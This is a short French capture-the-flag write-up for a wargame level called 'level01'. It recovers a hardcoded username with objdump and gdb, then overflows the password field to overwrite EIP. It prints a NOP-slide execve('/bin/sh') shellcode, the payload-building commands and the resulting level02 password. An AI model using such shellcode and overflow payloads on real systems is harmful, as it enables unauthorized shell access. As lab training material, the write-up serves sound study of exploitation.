Quand on lance le binaire ./level01 on nous demande d'entrer un username : 

********* ADMIN LOGIN PROMPT *********
Enter Username:

Pour le trouver c'est très simple il suffit de faire un objdump -d level01 et on trouve dans la fonction <verify_user_name> à l'instruction <+25> 0x80486a8 qui est mov dans %eax puis comparé a notre entrée.
En regardant avec gdb : 

x/s 0x80486a8 => "dat_wil"

On a donc notre username.

Ensuite un mot de passe nous est demandé (le mot de passe est admin on utilise la même technique pour le trouver) mais dans tout les cas on voit qu'aucune fonction permettant de récupérer le flag n'est présente dans le programme.

On peut réécrire sur l'EIP grâce au champ password. (buffer|76| -> EBP|4| -> EIP|4|)

Si on entre 84 * "A" dans le champ password on aura un crash a l'adresse 0x41414141 on va donc commencer par ajouter notre script dans l'environement avec un nop slide de 80 pour des questions de pratiques : 

> export SCRIPT=$(python -c 'print "\x90"*80 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"')

On lance gdb pour trouver une adresse qui tombe en plein dans les nops :
0xffffd900 => \x00\xd9\xff\xff

On place notre payload dans un fichier :
> python -c 'print "dat_wil" + "\n" + "A"*80 + "\x00\xd9\xff\xff"' > /tmp/toto

On lance le binaire avec le fichier /tmp/toto redirigé dans son stdin :
> (cat /tmp/toto; cat) | ./level01

cat /home/users/level02/.pass
    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv